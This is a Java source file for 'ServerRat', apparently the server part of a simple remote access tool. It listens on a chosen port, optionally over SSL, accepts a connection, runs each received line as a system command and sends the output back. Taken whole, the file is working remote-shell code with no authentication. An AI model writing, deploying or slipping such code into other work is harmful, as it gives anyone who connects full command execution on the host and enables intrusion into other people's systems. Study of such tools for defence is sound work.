package simpleRat;

import org.apache.commons.cli.*;

import javax.net.ssl.SSLServerSocketFactory;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class ServerRat {

    private static boolean quitFlag = false;
    private ServerSocket serverSocket;
    private Socket socket;
    private Process commandProcess;
    private BufferedReader commandInputStreamReader;
    private PrintWriter output;
    private static String listenPort;
    private static boolean encryptFlag;

    public ServerRat() {

    } //end of constructor

    public static void main(String[] args) {
        Options cmdLineOptions = new Options();
        Option port = new Option("p", "port", true, "port to listen on");
        port.setRequired(true);
        cmdLineOptions.addOption(port);
        Option sslEncrypt = new Option("s", "encrypt", false, "use ssl encryption");
        sslEncrypt.setRequired(false);
        cmdLineOptions.addOption(sslEncrypt);

        CommandLineParser parser = new BasicParser();
        HelpFormatter formatter = new HelpFormatter();

        try {
            CommandLine cmd = parser.parse(cmdLineOptions, args);
            listenPort = cmd.getOptionValue("port");
            encryptFlag = cmd.hasOption('s');
        } catch (ParseException e) {
            //System.out.println(e.toString());
            formatter.printHelp("java -jar ServerRat.jar", cmdLineOptions);
            System.exit(1);
        }

        ServerRat serverRat = new ServerRat();

        if (encryptFlag) {
            serverRat.createEncryptedServerSocket(listenPort);
        } else {
            serverRat.createServerSocket(listenPort);
        }

        while (!quitFlag) {
            String command = serverRat.recvCommand();
            serverRat.executeCommand(command);
            serverRat.sendCommandOutput();
        }
    } //end of main()

    public void createServerSocket(String port) {
        try {
            ServerSocket serverSocket = new ServerSocket(Integer.parseInt(port));
            System.out.println("Waiting for a connection..");
            socket = serverSocket.accept();
            System.out.println("Connection established!");
        } catch (IOException e) {
            System.out.println("IOException: " + e.toString());
        }
    } //end of createServerSocket()

    public void createEncryptedServerSocket(String port) {
        try {
            SSLServerSocketFactory sslServerSocketFactory = (SSLServerSocketFactory)SSLServerSocketFactory.getDefault();
            ServerSocket sslServerSocket = sslServerSocketFactory.createServerSocket(Integer.parseInt(port));
            System.out.println(sslServerSocket.toString());
            System.out.println("Waiting for a connection..");
            socket = sslServerSocket.accept();
            System.out.println("Connection established!");
        } catch (IOException e) {
            System.out.println("IOException: " + e.toString());
        }
    } //end of createEncryptedServerSocket()

    public String recvCommand() {
        String command = "";
        try {
            BufferedReader socketInputReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            command = socketInputReader.readLine();
            if (command.equals("quit")) {
                System.out.println("Client has ended the session.");
                socket.close();
                System.exit(0);
            }
        } catch (IOException e) {
            System.out.println(e.toString());
        }
        return command;
    } //end of recvCommand()

    public BufferedReader executeCommand(String clientCommand) {
        try {
            commandProcess = Runtime.getRuntime().exec(clientCommand);
            commandInputStreamReader = new BufferedReader(new InputStreamReader(commandProcess.getInputStream()));
        } catch (IOException e) {
            System.out.println(e.toString());
        }
        return commandInputStreamReader;
    } //end of executeCommand()

    public void sendCommandOutput() {
        try {
            String commandOutput = "";
            while ((commandOutput = commandInputStreamReader.readLine()) != null) {
                output = new PrintWriter(socket.getOutputStream(), true);
                output.println(commandOutput);
            }
            output.println("fin");
        } catch (IOException e) {
            System.out.println(e.toString());
        }
    } //end of sendCommandOutput()
} //end of ServerRat
